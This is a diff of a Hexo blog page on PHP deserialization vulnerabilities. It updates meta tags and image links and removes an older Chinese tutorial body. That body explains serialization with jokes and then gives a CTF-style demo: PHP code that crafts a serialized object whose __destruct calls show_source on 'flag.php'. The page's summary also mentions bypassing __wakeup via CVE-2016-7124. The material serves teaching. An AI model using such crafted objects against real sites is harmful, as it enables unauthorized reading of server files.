@@ -86,28 +86,26 @@
 
 
 
-<meta name="description" content="PHP反序列化漏洞老夫不才关注0.2852019.05.11 03:49:46字数 795阅读 907  0x00 何为类和对象 说到序列化和反序列化就不得不提到两个词：类和对象 那么什么是类，什么是对象 教科书式的答案是类是对象的抽象，对象是类的实例 那啥叫个抽象，啥叫个实例呢 简单的说，类就是对象的一个标准模板，而对象就是按照模板做出来的实物      一脸懵逼  举个栗子 人，是一个类 所有">
+<meta name="description" content="PHP反序列化漏洞 PHP反序列化漏洞原理概述-FIRST 1.绕过魔法函数 wakeup()魔法函数  在unserialize()反序列化函数执行时会检测是否存在wakeup()方法，如果存在会先调用wakeup()方法作为预先准备对象需要的资源，经常用于执行一些初始化操作，或者重现建立数据库连接等场景  PHP反序列化漏洞CVE-2016-7124  当反序列化字符串中，表示属性个数的值大于">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP反序列化漏洞">
 <meta property="og:url" content="https://abtgu.github.io/WEB%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="abtgu的博客">
-<meta property="og:description" content="PHP反序列化漏洞老夫不才关注0.2852019.05.11 03:49:46字数 795阅读 907  0x00 何为类和对象 说到序列化和反序列化就不得不提到两个词：类和对象 那么什么是类，什么是对象 教科书式的答案是类是对象的抽象，对象是类的实例 那啥叫个抽象，啥叫个实例呢 简单的说，类就是对象的一个标准模板，而对象就是按照模板做出来的实物      一脸懵逼  举个栗子 人，是一个类 所有">
-<meta property="og:image" content="https://upload.jianshu.io/users/upload_avatars/9144690/84f72a09-e33b-4e82-9356-89912829fd00.jpg?imageMogr2/auto-orient/strip%7CimageView2/1/w/96/h/96/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-ae31339cb9846b1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/272/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-c8a949a31304d500.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/216/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-2166e95ca5baef33.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/546/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-247cec07e75815be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/509/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-6a1f68569e1b1e2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-5e2ae1e0aa4b1218.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/450/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-2949f909bcab8fc0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/741/format/webp">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9144690-e7cf4e57fcaaca23.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/658/format/webp">
+<meta property="og:description" content="PHP反序列化漏洞 PHP反序列化漏洞原理概述-FIRST 1.绕过魔法函数 wakeup()魔法函数  在unserialize()反序列化函数执行时会检测是否存在wakeup()方法，如果存在会先调用wakeup()方法作为预先准备对象需要的资源，经常用于执行一些初始化操作，或者重现建立数据库连接等场景  PHP反序列化漏洞CVE-2016-7124  当反序列化字符串中，表示属性个数的值大于">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107202343431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107203022115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107211054749.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107211657762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107224524316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107215848498.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20191107225116628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-05-04T07:27:19.121Z">
-<meta property="article:modified_time" content="2020-05-04T07:29:41.655Z">
+<meta property="article:modified_time" content="2020-05-04T07:59:47.204Z">
 <meta property="article:author" content="abtgu">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="反序列化漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://upload.jianshu.io/users/upload_avatars/9144690/84f72a09-e33b-4e82-9356-89912829fd00.jpg?imageMogr2/auto-orient/strip%7CimageView2/1/w/96/h/96/format/webp">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20191107202343431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzcyNjgzMQ==,size_16,color_FFFFFF,t_70">
 
 
 
@@ -367,7 +365,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-05-04T15:29:41+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2020-05-04T15:59:47+08:00">
                 2020-05-04
               </time>
             
@@ -423,164 +421,126 @@
       
 
       
-        <section class="ouvJEz"><h1 class="_1RuRku">PHP反序列化漏洞</h1><div class="rEsl9f"><div class="_2mYfmT"><a class="_1OhGeD" href="/u/29d552d51bf3" target="_blank" rel="noopener noreferrer"><img class="_13D2Eh" src="https://upload.jianshu.io/users/upload_avatars/9144690/84f72a09-e33b-4e82-9356-89912829fd00.jpg?imageMogr2/auto-orient/strip|imageView2/1/w/96/h/96/format/webp" alt=""></a><div style="margin-left: 8px;"><div class="_3U4Smb"><span class="FxYr8x"><a class="_1OhGeD" href="/u/29d552d51bf3" target="_blank" rel="noopener noreferrer">老夫不才</a></span><button data-locale="zh-CN" type="button" class="_3kba3h _1OyPqC _3Mi9q9 _34692-"><span>关注</span></button></div><div class="s-dsoj"><span class="_3tCVn5"><i aria-label="ic-diamond" class="anticon"><svg width="1em" height="1em" fill="currentColor" aria-hidden="true" focusable="false" class=""><use xlink:href="#ic-diamond"></use></svg></i><span>0.285</span></span><time datetime="2019-05-10T19:49:46.000Z">2019.05.11 03:49:46</time><span>字数 795</span><span>阅读 907</span></div></div></div></div><article class="_2rhmJa"><blockquote>
-</blockquote>
-<h3>0x00 何为类和对象</h3>
-<p>说到序列化和反序列化就不得不提到两个词：<code>类</code>和<code>对象</code></p>
-<p>那么什么是类，什么是对象</p>
-<p>教科书式的答案是类是对象的抽象，对象是类的实例<br>
-那啥叫个抽象，啥叫个实例呢<br>
-简单的说，类就是对象的一个标准模板，而对象就是按照模板做出来的实物<br>
-</p><div class="image-package">
-<div class="image-container" style="max-width: 272px; max-height: 262px; background-color: transparent;">
-<div class="image-container-fill" style="padding-bottom: 96.32%;"></div>
-<div class="image-view" data-width="272" data-height="262"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-ae31339cb9846b1b.png" data-original-width="272" data-original-height="262" data-original-format="image/png" data-original-filesize="33334" data-image-index="0" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-ae31339cb9846b1b.png?imageMogr2/auto-orient/strip|imageView2/2/w/272/format/webp"></div>
-</div>
-<div class="image-caption">一脸懵逼</div>
-</div><br>
-举个栗子<br>
-<code>人</code>，是一个类<br>
-所有的<code>人</code>都有一个脑袋两个胳膊两个腿<br>
-这个就是关于所有人的一个标准模板<p></p>
-<p>而对象呢，对象跑了...nnp<br>
-假设一个真实存在的对象小芳，村里有个姑娘叫小芳，她的脑袋倍儿锃亮<br>
-这个就是一个具体的人了，小芳就是按照人的模板实际出来的一个实物</p>
-<br>
-<div class="image-package">
-<div class="image-container" style="max-width: 216px; max-height: 280px; background-color: transparent;">
-<div class="image-container-fill" style="padding-bottom: 129.63%;"></div>
-<div class="image-view" data-width="216" data-height="280"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-c8a949a31304d500.png" data-original-width="216" data-original-height="280" data-original-format="image/png" data-original-filesize="103869" data-image-index="1" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-c8a949a31304d500.png?imageMogr2/auto-orient/strip|imageView2/2/w/216/format/webp"></div>
-</div>
-<div class="image-caption">小芳表示不想见你</div>
-</div><br>
-<p>代码里具体是这样实现的</p>
-<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-php"><code class="  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">class</span> <span class="token class-name">BeautifulGirls</span><span class="token punctuation">{</span>
-        <span class="token comment">// 定义biu biu biu 忒否 girls的模板</span>
-        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
-<pre><code>    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fail_in_love&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;My name is &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;token variable&quot;&gt;$MissFang&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;BeautifulGirls&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;//实例化了一个biu 忒否 girl叫小芳&lt;/span&gt;
-</code></pre>
-<p><span class="token delimiter important">?&gt;</span></span><br />
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
-<h3>0x01 何为序列化和反序列化</h3>
-<p>了解类和对象了后，来看看什么是序列化和反序列化<br>
-（以下情景过于虚拟，推荐看官看看大刘的三体）</p>
-<blockquote>
-<p>三体中有这么一个情景，三体这个星球有三颗太阳，而且很不稳定，有时候离得近有时候离得远，有时候是一个，多的时候蹦出来仨斗地主，导致三体人长期生活在一个天气很不稳定的环境下，从而衍生出来了一种脱水的本领，仨太阳出来斗地主的时候，三体人就都脱水成为一张纸，以便保存，气候适宜的时候再由值班的人员将大家浸泡在水里，恢复形体...</p>
-</blockquote>
-<div class="image-package">
-<div class="image-container" style="max-width: 546px; max-height: 329px; background-color: transparent;">
-<div class="image-container-fill" style="padding-bottom: 60.260000000000005%;"></div>
-<div class="image-view" data-width="546" data-height="329"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-2166e95ca5baef33.png" data-original-width="546" data-original-height="329" data-original-format="image/png" data-original-filesize="224706" data-image-index="2" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-2166e95ca5baef33.png?imageMogr2/auto-orient/strip|imageView2/2/w/546/format/webp"></div>
-</div>
-<div class="image-caption">image.png</div>
-</div><br>
-<p>对三体人来说<br>
-脱水，就是序列化的过程<br>
-浸泡，就是反序列化</p>
-<p>而代码在运行的时候，有的时候需要将实例对象存储起来，这个时候就需要像三体人一样脱水，不过对象脱水只能变成一个字符串</p>
-<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-php"><code class="  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">class</span> <span class="token class-name">ThreeBody</span><span class="token punctuation">{</span>
-        <span class="token comment">// 定义类</span>
-        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">;</span>
-<pre><code>    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fail_in_love&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;My name is &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;token variable&quot;&gt;$reallyTreeBody&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ThreeBody&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;//实例化了一个对象&lt;/span&gt;
-
-&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$reallyTreeBody&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;//将对象序列化后输出&lt;/span&gt;
-</code></pre>
-<p><span class="token delimiter important">?&gt;</span></span><br />
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
-<p>运行后就会输出一个字符串，这个就是对象脱水<code>（序列化）</code>后的产物<br>
-</p><div class="image-package">
-<div class="image-container" style="max-width: 509px; max-height: 216px; background-color: transparent;">
-<div class="image-container-fill" style="padding-bottom: 42.44%;"></div>
-<div class="image-view" data-width="509" data-height="216"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-247cec07e75815be.png" data-original-width="509" data-original-height="216" data-original-format="image/png" data-original-filesize="7623" data-image-index="3" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-247cec07e75815be.png?imageMogr2/auto-orient/strip|imageView2/2/w/509/format/webp"></div>
-</div>
-<div class="image-caption">运行结果</div>
-</div><br>
-而这个字符串浸泡的时候，一定得有个模板作为标准才能恢复<p></p>
-<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-php"><code class="  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">class</span> <span class="token class-name">ThreeBody</span><span class="token punctuation">{</span>
-        <span class="token comment">// 定义类</span>
-        <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">;</span>
-<pre><code>    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fail_in_love&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token double-quoted-string string&quot;&gt;&quot;My name is &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;token variable&quot;&gt;$zhi&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token single-quoted-string string&quot;&gt;'O:9:&quot;ThreeBody&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;test&quot;;}'&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// 序列化后的字符串&lt;/span&gt;
-
-&lt;span class=&quot;token variable&quot;&gt;$reallyTreeBody&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$zhi&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// 把字符串浸泡恢复一下&lt;/span&gt;
-
-&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$reallyTreeBody&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// 成为对象了，把对象的name属性输出一下&lt;/span&gt;
-</code></pre>
-<p><span class="token delimiter important">?&gt;</span></span><br />
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
-<p>运行后，就会输出对象的<code>name</code><br>
-</p><div class="image-package">
-<div class="image-container" style="max-width: 400px; max-height: 182px; background-color: transparent;">
-<div class="image-container-fill" style="padding-bottom: 45.5%;"></div>
-<div class="image-view" data-width="400" data-height="182"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-6a1f68569e1b1e2e.png" data-original-width="400" data-original-height="182" data-original-format="image/png" data-original-filesize="5793" data-image-index="4" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-6a1f68569e1b1e2e.png?imageMogr2/auto-orient/strip|imageView2/2/w/400/format/webp"></div>
-</div>
-<div class="image-caption">image.png</div>
-</div><p></p>
-<h3>0x02 具体漏洞演示</h3>
-<p></p><div class="image-package">
-<div class="image-container" style="max-width: 450px; max-height: 323px; background-color: transparent;">
-<div class="image-container-fill" style="padding-bottom: 71.78%;"></div>
-<div class="image-view" data-width="450" data-height="323"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-5e2ae1e0aa4b1218.png" data-original-width="450" data-original-height="323" data-original-format="image/png" data-original-filesize="17963" data-image-index="5" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-5e2ae1e0aa4b1218.png?imageMogr2/auto-orient/strip|imageView2/2/w/450/format/webp"></div>
-</div>
-<div class="image-caption">image.png</div>
-</div><br>
-如上图，这个页面会将参数f进行反序列，然后在析构函数里面会把对象的<code>test</code>参数源码输出出来<p></p>
-<blockquote>
-<p>插一句析构函数(__destruct)，这个函数是在对象被销毁的时候调用的函数，当页面运行完时，会回收内存，将对象消毁，所以页面结束时就能触发<br>
-同时还有其他的一些函数自己去搜一搜</p>
-</blockquote>
-<p>当我们想要它显示指定的源码时，就需要构造一个对象，<code>test</code>属性内容就是文件名</p>
-<p>那我们就可以在本地先写一个指定<code>test</code>属性内容的对象，然后去序列化一下，再将字符串反序列化就能得到我们指定的一个对象（其实就是脱裤子放屁，脱水一下再去浸泡一下）</p>
-<div class="_2Uzcx_"><button class="VJbwyy" type="button" aria-label="复制代码"><i aria-label="icon: copy" class="anticon anticon-copy"><svg viewBox="64 64 896 896" focusable="false" class="" data-icon="copy" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M832 64H296c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h496v688c0 4.4 3.6 8 8 8h56c4.4 0 8-3.6 8-8V96c0-17.7-14.3-32-32-32zM704 192H192c-17.7 0-32 14.3-32 32v530.7c0 8.5 3.4 16.6 9.4 22.6l173.3 173.3c2.2 2.2 4.7 4 7.4 5.5v1.9h4.2c3.5 1.3 7.2 2 11 2H704c17.7 0 32-14.3 32-32V224c0-17.7-14.3-32-32-32zM350 856.2L263.9 770H350v86.2zM664 888H414V746c0-22.1-17.9-40-40-40H232V264h432v624z"></path></svg></i></button><pre class="line-numbers  language-php"><code class="  language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token keyword">class</span> <span class="token class-name">example</span><span class="token punctuation">{</span>
-        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">;</span>
-<pre><code>    &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;show_source&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;token property&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;token variable&quot;&gt;$a&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;token keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
-</code></pre>
-<p><span class="token delimiter important">?&gt;</span></span><br />
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
-<p>运行后就能得到我们想要的对象的序列化结果</p>
-<br>
-<div class="image-package">
-<div class="image-container" style="max-width: 700px; max-height: 217px; background-color: transparent;">
-<div class="image-container-fill" style="padding-bottom: 29.28%;"></div>
-<div class="image-view" data-width="741" data-height="217"><img data-original-src="//upload-images.jianshu.io/upload_images/9144690-2949f909bcab8fc0.png" data-original-width="741" data-original-height="217" data-original-format="image/png" data-original-filesize="13637" data-image-index="6" style="cursor: zoom-in;" class="" src="//upload-images.jianshu.io/upload_images/9144690-2949f909bcab8fc0.png?imageMogr2/auto-orient/strip|imageView2/2/w/741/format/webp"></div>
-</div>
-<div class="image-caption">image.png</div>
-</div>
